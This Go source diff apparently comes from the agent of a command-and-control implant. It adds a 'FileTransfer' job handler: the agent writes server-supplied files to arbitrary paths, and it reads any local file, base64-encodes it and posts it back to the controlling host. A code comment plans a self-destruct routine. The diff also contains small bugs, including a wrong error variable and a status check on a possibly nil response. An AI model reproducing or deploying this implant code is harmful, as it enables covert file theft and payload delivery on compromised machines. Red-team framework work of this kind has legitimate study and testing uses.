@@ -33,6 +33,9 @@ import (
 	"runtime"
 	"strconv"
 	"time"
+	"crypto/sha1"
+	"io"
+	"path/filepath"
 
 	"github.com/fatih/color"
 	"github.com/satori/go.uuid"
@@ -287,52 +290,125 @@ func statusCheckIn(host string, client *http.Client) {
 			color.Green("%s Message Type Received!", j.Type)
 		}
 		switch j.Type { // TODO add self destruct that will find the .exe current path and start a new process to delete it after initial sleep
-		case "UploadFile":
-			var p messages.UploadFile
+		case "FileTransfer":
+			var p messages.FileTransfer
 			json.Unmarshal(payload, &p)
-			// Setup the message to submit the status of the upload
-			c := messages.CmdResults{
-				Job:    p.Job,
-				Stdout: "",
-				Stderr: "",
-			}
-			if verbose || debug {
-				color.Yellow("Writing blob to : %s", p.Dest)
-			}
-			d1, err := base64.StdEncoding.DecodeString(p.FileBlob)
-			if err != nil {
-				c.Stderr = err.Error()
-				if verbose || debug {
-					color.Red("[!]There was an error decoding the fileBlob")
-					color.Red(err.Error())
-				}
-			} else {
-				err = ioutil.WriteFile(p.Dest, d1, 0644)
-				if err != nil {
-					c.Stderr = err.Error()
-					if verbose || debug {
-						color.Red("[!]There was an error writing to : %s", p.Dest)
-						color.Red(err.Error())
-					}
-				} else {
-					c.Stdout = fmt.Sprintf("Successfully wrote to %s", p.Dest)
-				}
 
-			}
-			k, _ := json.Marshal(c)
 			g := messages.Base{
 				Version: 1.0,
 				ID:      j.ID,
-				Type:    "CmdResults",
-				Payload: (*json.RawMessage)(&k),
 				Padding: randStringBytesMaskImprSrc(paddingMax),
+			}
+
+			// Agent will be downloading a file from the server
+			if p.IsDownload {
+				if verbose {color.Green("FileTransfer type: Download")}
+				// Setup the message to submit the status of the upload
+				c := messages.CmdResults{
+					Job:    p.Job,
+					Stdout: "",
+					Stderr: "",
+				}
+
+				d, _ := filepath.Split(p.FileLocation)
+				_, directoryPathErr := os.Stat(d)
+				if directoryPathErr != nil {
+					if verbose {
+						color.Red("[!]There was an error getting the FileInfo structure for the directory %s", d)
+						color.Red(directoryPathErr.Error())
+					}
+					c.Stderr = fmt.Sprintf("[!]There was an error getting the FileInfo structure for the " +
+						"remote directory %s:\r\n", p.FileLocation)
+					c.Stderr += fmt.Sprintf(directoryPathErr.Error())
+				}
+				if c.Stderr == "" {
+					if verbose {
+						color.Yellow("[-]Writing file to %s", p.FileLocation)
+					}
+					downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(p.FileBlob)
+					if downloadFileErr != nil {
+						c.Stderr = downloadFileErr.Error()
+						if verbose {
+							color.Red("[!]There was an error decoding the fileBlob")
+							color.Red(downloadFileErr.Error())
+						}
+					} else {
+						errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0644)
+						if errF != nil {
+							c.Stderr = err.Error()
+							if verbose {
+								color.Red("[!]There was an error writing to : %s", p.FileLocation)
+								color.Red(errF.Error())
+							}
+						} else {
+							if verbose {
+								color.Green("[+]Successfully download file to %s", p.FileLocation)
+							}
+							c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent", p.FileLocation)
+						}
+					}
+				}
+
+				k, _ := json.Marshal(c)
+				g.Type = "CmdResults"
+				g.Payload = (*json.RawMessage)(&k)
+			}
+
+			// Agent will uploading a file to the server
+			if !p.IsDownload {
+				if verbose {color.Green("FileTransfer type: Upload")}
+
+				fileData, fileDataErr := ioutil.ReadFile(p.FileLocation)
+				if fileDataErr != nil {
+					if verbose {
+						color.Red("[!]There was an error reading %s", p.FileLocation)
+						color.Red(fileDataErr.Error())
+					}
+					errMessage := fmt.Sprintf("[!]There was an error reading %s\r\n", p.FileLocation)
+					errMessage += fileDataErr.Error()
+					c := messages.CmdResults{
+						Job:    p.Job,
+						Stderr: errMessage,
+					}
+					if verbose {
+						color.Yellow("[-]Sending error message to sever.")
+					}
+					k, _ := json.Marshal(c)
+					g.Type = "CmdResults"
+					g.Payload = (*json.RawMessage)(&k)
+
+				} else {
+					fileHash := sha1.New()
+					io.WriteString(fileHash, string(fileData))
+
+					if verbose {
+						color.Yellow("[-]Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
+							p.FileLocation,
+							len(fileData),
+							fileHash.Sum(nil))
+					}
+					c := messages.FileTransfer{
+						FileLocation: p.FileLocation,
+						FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
+						IsDownload:   true,
+						Job:          p.Job,
+					}
+
+					k, _ := json.Marshal(c)
+					g.Type = "FileTransfer"
+					g.Payload = (*json.RawMessage)(&k)
+
+				}
 			}
 			b2 := new(bytes.Buffer)
 			json.NewEncoder(b2).Encode(g)
-			if verbose {
-				color.Yellow("Sending response to server\n %s\n%s", c.Stdout, c.Stderr)
+			resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
+			if respErr != nil {
+				if verbose {
+					color.Red("There was an error sending the FileTransfer message to the server")
+					color.Red(respErr.Error())
+				}
 			}
-			resp2, _ := client.Post(host, "application/json; charset=utf-8", b2)
 			if resp2.StatusCode != 200 {
 				color.Red("Message error from server. HTTP Status code: %d", resp2.StatusCode)
 			}
